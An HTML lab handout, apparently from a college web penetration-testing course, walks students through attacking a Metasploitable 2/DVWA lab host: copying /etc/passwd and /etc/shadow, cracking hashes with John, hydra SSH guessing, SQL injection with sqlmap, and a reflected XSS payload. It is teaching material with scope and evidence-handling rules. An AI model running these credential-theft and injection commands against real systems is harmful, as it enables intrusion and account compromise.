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" alt="Focus College"><span class="wk">Week 7 · Lab</span></div>
+<h1>Web Application Pen Test Lab</h1>
+<p>Interleaved with tonight's lecture. We test Acme's authorized web apps on Metasploitable 2 with Burp Suite Community, OWASP ZAP and sqlmap — SQLi, XSS, IDOR, and a Repeater evidence workflow. Parts are labelled <em>Do together after Section N</em>.</p>
+<div class="meta"><span>Target: 192.168.1.200 (DVWA / Mutillidae)</span><span>Free tools only</span><span>week7-lab-assets-student.zip</span><span>Phase 3b evidence</span></div>
+</header>
+<div class="wrap">
+<nav>
+<a href="#p0">Part 0 &mdash; Setup<span></span></a>
+<a href="#p0b">Part 0b &mdash; Password cracking<span>opens tonight</span></a>
+<a href="#pa">Part A &mdash; SQLi<span>after Sec 2</span></a>
+<a href="#pb">Part B &mdash; XSS / IDOR<span>after Sec 3</span></a>
+<a href="#pc">Part C &mdash; Burp / ZAP<span>after Sec 4</span></a>
+<a href="#pd">Part D &mdash; Code reading<span></span></a>
+<a href="#p3b">Phase 3b wrap<span></span></a>
+</nav>
+<main>
+
+<div class="note"><b>Get the zip:</b> download <code>week7-lab-assets-student.zip</code> and unzip it next to this file so <code>lab-assets/</code> paths resolve. <b>Primary target:</b> Metasploitable 2 at <code>192.168.1.200</code>. <b>No VM?</b> Use files under <code>lab-assets/sample-output/</code> — labelled <b>fallback only</b>.</div>
+
+<div class="part" id="p0"><div class="phead"><h2>Part 0 &mdash; Setup</h2></div>
+<div class="goal"><b>Goal:</b> confirm Kali reaches acme-legacy web apps and Burp can see browser traffic.</div>
+<div class="lbl">Do this</div>
+<pre>ping -c 2 192.168.1.200
+curl -I http://192.168.1.200/dvwa/
+burpsuite &amp;   # temporary project; proxy listen 127.0.0.1:8080
+# Point a dedicated lab browser profile at 127.0.0.1:8080
+# Visit http://192.168.1.200/dvwa/ — login admin / password
+# DVWA → DVWA Security → Low → Submit</pre>
+<div class="lbl">What each part of the command means</div>
+<div class="explain"><code>ping -c 2</code> sends two ICMP echoes to confirm L3 reachability. <code>curl -I</code> fetches HTTP headers only to confirm the DVWA vhost responds. <code>burpsuite &amp;</code> starts Burp Community in the background so the terminal stays free.</div>
+<div class="lbl">What you should see</div>
+<pre class="out">64 bytes from 192.168.1.200: icmp_seq=1 ...
+HTTP/1.1 200 OK
+... Burp HTTP history filling with /dvwa/ requests ...</pre>
+<div class="lbl">What it means</div>
+<div class="explain">You have attacker IP (Kali), target IP (acme-legacy), an authenticated DVWA session at security Low, and a working intercepting proxy path. Substitute your own PHPSESSID wherever examples show <code>REDACTED</code>.</div>
+<div class="warn"><b>Fallback only:</b> if the VM is down, open <code>lab-assets/sample-output/burp-repeater-flow.txt</code> and continue with paper proofs.</div>
+</div>
+
+<div class="part" id="p0b"><div class="phead"><h2>Part 0b &mdash; Password cracking (Week 5 carry-over)</h2></div>
+<div class="together">Do first &mdash; the authentication-attacks topic we ran out of time for in Week 5, finished at the start of tonight before the web parts.</div>
+<div class="goal"><b>Goal:</b> turn captured password hashes from the compromised acme-legacy host into working credentials (offline with John the Ripper), then demonstrate an online guess with hydra, and produce minimum proof for a weak-credentials finding.</div>
+<div class="note"><b>Starter material:</b> <code>lab-assets/password-cracking/</code> (crack-commands.sh, pw-small.txt, and clearly labelled fallback files). <b>Primary target:</b> Metasploitable 2 at <code>192.168.1.200</code> &mdash; you already have a root shell from the Week 5 exploitation.</div>
+
+<div class="lbl">Do this &mdash; OFFLINE (John the Ripper)</div>
+<pre># On the LIVE target (you already have root from Week 5):
+cp /etc/passwd /root/acme-passwd.txt
+cp /etc/shadow /root/acme-shadow.txt
+# copy both back to Kali, then:
+unshadow acme-passwd.txt acme-shadow.txt &gt; acme-hashes.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt acme-hashes.txt
+john --show acme-hashes.txt</pre>
+<div class="lbl">What each part of the command means</div>
+<div class="explain"><code>/etc/passwd</code> lists accounts (no passwords); <code>/etc/shadow</code> holds the hashes and is root-only &mdash; which is why we needed root first. <code>unshadow</code> merges the two into the one format John reads; <code>&gt;</code> writes it to <code>acme-hashes.txt</code>. <code>john --wordlist=</code> cracks using rockyou.txt (real leaked passwords); <code>john --show</code> reprints what already cracked from John's pot file.</div>
+<div class="lbl">What you should see (realistic &mdash; from known Metasploitable 2 weak accounts)</div>
+<pre class="out">Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ ... [MD5])
+msfadmin         (msfadmin)
+postgres         (postgres)
+user             (user)
+service          (service)
+batman           (sys)
+# john --show:
+5 password hashes cracked, 2 left   (root and klog use strong passwords)</pre>
+<div class="lbl">What it means</div>
+<div class="explain">The accounts used dictionary-word passwords, so weak reused credentials fell in seconds. Each <code>plaintext (account)</code> line is a working login you can reuse elsewhere &mdash; a single foothold becoming broader access.</div>
+
+<div class="lbl">Do this &mdash; ONLINE (hydra), RoE: in-scope lab host only</div>
+<pre># tiny controlled wordlist (already shipped as pw-small.txt)
+printf 'msfadmin\nuser\nservice\npassword\n123456\n' &gt; pw-small.txt
+hydra -l msfadmin -P pw-small.txt ssh://192.168.1.200</pre>
+<div class="lbl">What each part of the command means</div>
+<div class="explain"><code>-l msfadmin</code> tries one login name; <code>-P pw-small.txt</code> tries each password in the file; <code>ssh://192.168.1.200</code> names the authorized Secure Shell (SSH) service on the in-scope host. Keep the list tiny and mind lockouts.</div>
+<div class="lbl">What you should see</div>
+<pre class="out">[22][ssh] host: 192.168.1.200   login: msfadmin   password: msfadmin
+1 of 1 target successfully completed, 1 valid password found</pre>
+<div class="lbl">What it means</div>
+<div class="explain">hydra logged in for real, so the credential is live-verified &mdash; but every guess was a genuine SSH login attempt that hits the server's logs, which is why online cracking is far louder than offline.</div>
+
+<div class="chk">Minimum proof: ONE screenshot of a cracked credential showing the account name (e.g. the <code>msfadmin</code> line), with the rest of the hashes/plaintext redacted. Do not paste the full cracked list into the report body.</div>
+<div class="warn"><b>RoE:</b> online guessing is only ever allowed against the in-scope lab host named in the authorization letter. Never a production or third-party service.</div>
+<div class="note"><b>Fallback only:</b> if the VM is down, use <code>lab-assets/password-cracking/sample-passwd.txt</code>, <code>sample-shadow.txt</code> and <code>sample-john-output.txt</code> (and <code>crack-commands.sh</code>) &mdash; labelled fallback only, not a substitute for the live host.</div>
+<button class="solbtn" type="button">Show checkpoint</button>
+<div class="sol"><b>Checkpoint:</b> one cracked credential captured with its account name, plus a one-line weak-credentials finding (impact + remediation: passphrase policy, MFA, salted slow hashing, lockout) started for Phase 3.</div>
+</div>
+
+<div class="part" id="pa"><div class="phead"><h2>Part A &mdash; SQL injection on DVWA</h2></div>
+<div class="goal"><b>Goal:</b> produce in-band SQLi minimum proof (OWASP A03) and optionally enumerate databases with sqlmap under RoE discipline.</div>
+
+<div class="lbl">Do this (exact actions)</div>
+<pre># Browser (proxied): DVWA → SQL Injection
+# User ID field: 1' OR '1'='1
+# Click Submit
+# In Burp: Proxy → HTTP history → find the sqli request → Send to Repeater
+# Confirm multi-row response; save request/response into the Phase 3b template
+
+# Optional enumeration (only if you treat RoE as allowing it in this lab):
+sqlmap -u "http://192.168.1.200/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" \
+  --cookie="PHPSESSID=REDACTED; security=low" \
+  -p id --dbs --batch</pre>
+<div class="lbl">What each part of the command means</div>
+<div class="explain"><code>-u</code> is the target URL with the injectable parameter. <code>--cookie</code> sends the session and DVWA security level. <code>-p id</code> limits testing to that parameter. <code>--dbs</code> lists databases. <code>--batch</code> answers prompts with defaults (non-interactive).</div>
+<div class="lbl">What you should see</div>
+<pre class="out">First name / Surname rows for multiple users on the DVWA page
+# sqlmap (optional): available databases include dvwa, information_schema, ...</pre>
+<div class="lbl">What it means</div>
+<div class="explain">The application concatenated input into SQL. Foreign rows are your proof. Stop before bulk <code>--dump</code> unless your written RoE explicitly allows data extraction — tonight minimum proof is enough for the checkpoint.</div>
+<div class="note"><b>Fallback only:</b> <code>lab-assets/sample-output/sqli-dvwa-low.txt</code> and <code>sqlmap-dbs.txt</code>.</div>
+<button class="solbtn" type="button">Show checkpoint</button>
+<div class="sol"><b>Checkpoint:</b> Phase 3b worksheet started for A03 with request/response and an Acme impact sentence. Optional sqlmap stopped at <code>--dbs</code>.</div>
+</div>
+
+<div class="part" id="pb"><div class="phead"><h2>Part B &mdash; XSS and IDOR evidence</h2></div>
+<div class="goal"><b>Goal:</b> capture one A07 (XSS) proof and one A01 (IDOR / broken access) proof.</div>
+<div class="lbl">Do this (exact actions)</div>
+<pre># XSS Reflected (DVWA Low)
+# DVWA → XSS (Reflected) → name: &lt;script&gt;alert(1)&lt;/script&gt; → Submit
+# Screenshot the alert; save the Burp history entry
+
+# IDOR-style (Mutillidae on same host)
+# Browse http://192.168.1.200/mutillidae/
+# OWASP 2013 → A4 Insecure Direct Object References (or current menu equivalent)
+# View a user object, change the identifying parameter to another value, compare responses</pre>
+<div class="lbl">What you should see</div>
+<pre class="out">JavaScript alert from DVWA origin
+Two Mutillidae (or similar) responses showing different users' data under one session</pre>
+<div class="lbl">What it means</div>
+<div class="explain">XSS shows the browser trusts reflected markup as script. IDOR shows the server failed an object-level authorization check. Write separate worksheets — do not merge them into one finding.</div>
+<div class="note"><b>Fallback only:</b> <code>lab-assets/sample-output/xss-reflected.txt</code> and <code>idor-demo.txt</code>.</div>
+<div class="warn">If you test stored XSS, remove your payload before leaving the module.</div>
+<button class="solbtn" type="button">Show checkpoint</button>
+<div class="sol"><b>Checkpoint:</b> two draft findings (A07 and A01) with evidence paths named in your notes.</div>
+</div>
+
+<div class="part" id="pc"><div class="phead"><h2>Part C &mdash; Burp workflow (+ optional ZAP)</h2></div>
+<div class="goal"><b>Goal:</b> finish one complete Phase 3b worksheet from a Repeater mutation; optionally compare ZAP alerts.</div>
+<div class="lbl">Do this (exact actions)</div>
+<pre># In Burp HTTP history: pick your best SQLi or XSS request
+# Right-click → Send to Repeater → mutate one parameter → Send
+# Copy request/response into lab-assets/templates/phase3b-evidence-template.md
+
+# Optional ZAP comparison (do not fight Burp for port 8080 — stop Burp proxy or use another port):
+zaproxy &amp;
+# Point browser at ZAP's proxy; browse DVWA; review Alerts
+# Write one sentence: which alerts duplicate your manual proof vs which need triage</pre>
+<div class="lbl">What each part means</div>
+<div class="explain">Repeater replays a single edited request without re-clicking the site. ZAP's alert panel is a discovery aid — you still promote only what you can prove and that sits in scope.</div>
+<div class="lbl">Optional Juice Shop</div>
+<pre>docker run --rm -p 3000:3000 bkimminich/juice-shop
+# Then browse http://127.0.0.1:3000 through Burp — optional, not required tonight</pre>
+<div class="note"><b>Fallback only:</b> <code>lab-assets/sample-output/burp-repeater-flow.txt</code>.</div>
+<button class="solbtn" type="button">Show checkpoint</button>
+<div class="sol"><b>Checkpoint:</b> one completed Phase 3b worksheet saved in your engagement folder (and ready to paste into Assignment 3).</div>
+</div>
+
+<div class="part" id="pd"><div class="phead"><h2>Part D &mdash; Reading vulnerable code</h2></div>
+<div class="goal"><b>Goal:</b> connect a proof to a root-cause line in teaching snippets.</div>
+<div class="lbl">Do this</div>
+<pre>cd lab-assets/vulnerable-code
+# Read sqli_concat.php and sqli_fixed.php side by side
+# Read xss_echo.php and xss_fixed.php
+# Skim cmd_concat.php and write the fix idea in your own words (no shell / allowlist)</pre>
+<div class="lbl">What you should see</div>
+<pre class="out">Concatenation of $_GET into SQL or HTML; fixed files using prepared statements or htmlspecialchars</pre>
+<div class="lbl">What it means</div>
+<div class="explain">Developers fix sinks, not tool logos. Your remediation paragraph should point at parameterization or encoding the way these snippets do.</div>
+<button class="solbtn" type="button">Show checkpoint</button>
+<div class="sol"><b>Checkpoint:</b> three bullets in your notes — SQLi root cause, XSS root cause, command-injection fix idea — in plain language.</div>
+</div>
+
+<div class="part" id="p3b"><div class="phead"><h2>Phase 3b wrap &amp; Assignment 3</h2></div>
+<div class="goal"><b>Goal:</b> leave with evidence hygiene and a clear Assignment 3 plan.</div>
+<div class="lbl">Do this</div>
+<pre># Open lab-assets/templates/assignment3-brief.md and skim due date + required findings
+# Ensure at least one completed Phase 3b worksheet exists
+# Redact cookies/passwords before any LMS upload
+# Confirm stored payloads were removed</pre>
+<div class="chk">Done when: three findings are planned for Assignment 3 (SQLi required; XSS or IDOR required; one more distinct OWASP category), and tonight's evidence is filed with timestamps.</div>
+<div class="note">Due: <b>Friday, November 20, 2026, 11:59 pm PT</b> · 6% · Web Application Penetration Test.</div>
+</div>
+
+</main>
+</div>
+<script>
+document.querySelectorAll('.solbtn').forEach(b=>b.addEventListener('click',()=>{
+  const s=b.nextElementSibling; s.classList.toggle('on');
+  b.textContent = s.classList.contains('on') ? 'Hide checkpoint' : 'Show checkpoint';
+}));
+</script>
+</body></html>
